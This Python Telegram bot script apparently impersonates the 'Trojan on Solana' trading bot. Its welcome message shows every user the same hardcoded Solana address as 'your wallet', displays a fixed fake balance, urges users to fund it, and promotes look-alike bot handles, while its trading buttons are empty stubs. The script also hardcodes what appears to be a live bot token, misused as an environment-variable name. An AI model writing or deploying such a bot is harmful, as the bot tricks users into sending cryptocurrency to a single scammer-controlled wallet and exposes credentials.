import os
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Set up logging to monitor errors and debug information
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Define the admin Telegram user ID
ADMIN_ID = 5698476270  # Replace with your Telegram user ID

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Settings", callback_data="settings"),
        ],
        [
            InlineKeyboardButton("Admin Page", callback_data="admin_page"),
            InlineKeyboardButton("Help", callback_data="help"),
        ],
    ])

# Admin Page Keyboard with additional options
def admin_page_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("User Stats", callback_data="user_stats"),
            InlineKeyboardButton("Bot Activity Logs", callback_data="bot_logs"),
        ],
        [
            InlineKeyboardButton("Database Status", callback_data="db_status"),
            InlineKeyboardButton("Back to Main Menu", callback_data="back_to_main"),
        ],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_message = (
        "Welcome to Trojan on Solana!\n\n"
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Here's your Solana wallet address linked to your Telegram account. "
        "Simply fund your wallet and dive into trading.\n\n"
        "Solana\n\n"
        "CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat\n"
        "(tap to copy)\n\n"
        "Balance: (2.419) SOL\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!\n\n"
        "If you aren't already, we advise that you use any of the following bots to trade with. "
        "You will have the same wallets and settings across all bots, but it will be significantly "
        "faster due to lighter user load.\n\n"
        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot\n"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Function to handle button presses
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == "buy":
        await query.edit_message_text("Buy option selected", reply_markup=main_menu_keyboard())
    elif query.data == "sell":
        await query.edit_message_text("Sell option selected", reply_markup=main_menu_keyboard())
    elif query.data == "positions":
        await query.edit_message_text("Positions option selected", reply_markup=main_menu_keyboard())
    elif query.data == "limit_orders":
        await query.edit_message_text("Limit Orders option selected", reply_markup=main_menu_keyboard())
    elif query.data == "referrals":
        await query.edit_message_text("Referrals option selected", reply_markup=main_menu_keyboard())
    elif query.data == "withdraw":
        await query.edit_message_text("Withdraw option selected", reply_markup=main_menu_keyboard())
    elif query.data == "copy_trade":
        await query.edit_message_text("Copy Trade option selected", reply_markup=main_menu_keyboard())
    elif query.data == "settings":
        await query.edit_message_text("Settings option selected", reply_markup=main_menu_keyboard())
    elif query.data == "help":
        await query.edit_message_text("Help option selected", reply_markup=main_menu_keyboard())
    elif query.data == "admin_page":
        await query.edit_message_text("Admin Page", reply_markup=admin_page_keyboard())
    elif query.data == "back_to_main":
        await query.edit_message_text("Returning to main menu...", reply_markup=main_menu_keyboard())

# Function to set up the bot and bind to a port
def run_bot():
    TOKEN = os.getenv("7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU")  # Use environment variable for token
    port = int(os.getenv("PORT", 8443))  # Default to port 8443 if not set
    
    # Set up the application
    application = Application.builder().token(TOKEN).build()

    # Add handlers for commands and button clicks
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Run polling
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        webhook_url=f"https://{os.getenv('RENDER_EXTERNAL_HOSTNAME')}/webhook"
    )

# Entry point of the script
if __name__ == "__main__":
    run_bot()
